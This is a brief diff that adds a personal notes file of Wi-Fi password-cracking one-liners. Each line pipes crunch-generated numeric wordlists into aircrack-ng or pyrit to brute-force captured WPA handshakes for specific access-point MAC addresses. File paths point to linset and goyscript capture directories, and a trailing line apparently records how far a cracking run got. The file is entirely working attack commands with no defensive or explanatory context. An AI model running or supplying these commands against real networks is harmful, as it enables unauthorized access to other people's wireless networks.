@@ -1,0 +1,7 @@
+crunch 8 8 1234567890 -t 1676@@@@ | aircrack-ng --bssid 14:5B:D1:44:39:15 -w- /home/nicolau/Downloads/linset-master/14:5B:D1:44:39:15-01.cap
+
+crunch 8 10 0123456789 | pyrit -r /opt/goyscript/handshakes/NetvirtBL22.cap -b 7C:05:07:FD:2D:73 -i - attack_passthrough
+
+crunch 8 8 1234567890 -t @@@@@@@@ | aircrack-ng --bssid 70:62:B8:2E:99:00 -w- /root/Desktop/70:62:B8:2E:99:00-01.cap
+
+ending at 14733796
